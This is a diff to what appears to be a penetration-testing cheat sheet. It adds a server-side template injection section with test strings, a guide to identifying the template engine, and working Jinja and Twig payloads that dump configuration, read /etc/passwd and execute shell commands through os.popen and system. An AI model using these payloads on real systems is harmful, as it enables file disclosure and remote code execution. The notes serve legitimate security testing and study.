@@ -73,13 +73,46 @@ We can use [Gopherus](https://github.com/tarunkant/Gopherus) to craft these payl
 - LFI attempts may show different error messages for files that exist versus files that don't.
 
 ## SSTI
+
+### Tepmlate engines
+
+- [Jinga](https://jinja.palletsprojects.com/en/stable/)
+- [Twig](https://twig.symfony.com/)
+
 ### Exploitation
-Templating Engines are used to dynamically generate content
+
+Templating Engines are used to dynamically generate content.
 
 ### Test String
-- `${{<%[%'"}}%\.`
+
+- `${{<%[%'"}}%\.` Should result in an error message if the template is vulnerable.
+- Follow the below tree looking to find when payload is executed successfully i.e. 7*7 returns 49.
+- {{7*'7'}} will be 7777777 in Jinja, while in Twig, the result will be 49.
+
+![Identifying Template Engine](..\images\identify-template.png)
+
+### Jinga(python)
+
+| Payload | Description |
+|---------|-------------|
+| `{{ config.items() }}` | Dump web app config file |
+| `{{ self.__init__.__globals__.__builtins__ }}` | Dump built in functions |
+| `{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}` | Use the python `open()` function to perform LFI |
+| `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}` | Import the python `os` library to perform RCE |
+
+### Twig(PHP)
+
+| Payload | Description |
+|---------|-------------|
+| `{{ _self }}` | Dump a small amount of info about the current template |
+| `{{ "/etc/passwd"\|file_excerpt(1,-1) }}` | Use the `file_excerpt()` function from the [Symfony](https://symfony.com/) framework to perform LFI |
+| `{{ ['id'] \| filter('system') }}` | RCE using twigs `filter()` function to pass arguments to `system` the built-in PHP function |
+
+[Payload all the things cheat sheet for other templates](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md)
+
 
 ## SSI Injection - Directives
+
 | Directive | Description |
 |-----------|-------------|
 | `<!--#printenv -->` | Print variables |
